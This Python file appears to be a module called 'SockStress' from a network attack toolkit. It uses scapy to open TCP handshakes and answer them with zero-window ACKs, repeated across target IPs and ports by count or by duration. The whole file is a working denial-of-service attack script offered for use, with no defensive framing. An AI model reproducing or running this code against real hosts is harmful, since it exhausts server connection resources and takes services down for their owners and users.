from scapy.all import *

from lib.cmd_tool import *

NAME = 'SockStress'

class Module:
    def __init__(self):
        self.config = DEFAULT_CONFIG_LAYER4

        self.help = ''

    def validate(self) -> bool:
        
        return True

    def interactive(self):
        interactive(self, 'sockstress')

    def run(self):
        print(conf.iface)
        conf.iface = 'Wi-Fi'
        print(conf.iface)
        def sockstress(szIP: str, nPort: int, nTimeout: int):
            port = randInt()
            resp = sr1(IP(dst=szIP) / TCP(sport=port, dport=nPort, flags='S'), timeout=nTimeout, verbose=False)
            
            if resp:
                send(IP(dst=szIP) / TCP(dport=nPort, sport=port, window=0, flags='A',ack=(resp['TCP'].seq + 1)) / '\x00\x00', verbose=False)

        try:
            lsIP = str2strls(get_value(self.config, 'IP'))
            lsPort = str2intls(get_value(self.config, 'Ports'))
            nCnt = int(get_value(self.config, 'Count'))
            nTime = int(get_value(self.config, 'Time'))
            nTimeout = int(get_value(self.config, 'Timeout'))
            nMode = int(get_value(self.config, 'Mode'))

            total = 0

            for ip in lsIP:
                for port in lsPort:
                    if nMode == MODE_COUNT:
                        for _ in range(0, nCnt):
                            sockstress(ip, port, nTimeout)
                            total += 1
                    
                    elif nMode == MODE_TIME:
                        param = {
                            'szIP': ip,
                            'nPort': port,
                            'nTimeout': nTimeout,
                        }

                        total += doWorkWithSeconds(sockstress, nTime, param)
            
            cp.pf_failed(f'Done, total={total}')
            
        except Exception as ex:
            cp.pf_failed(str(ex))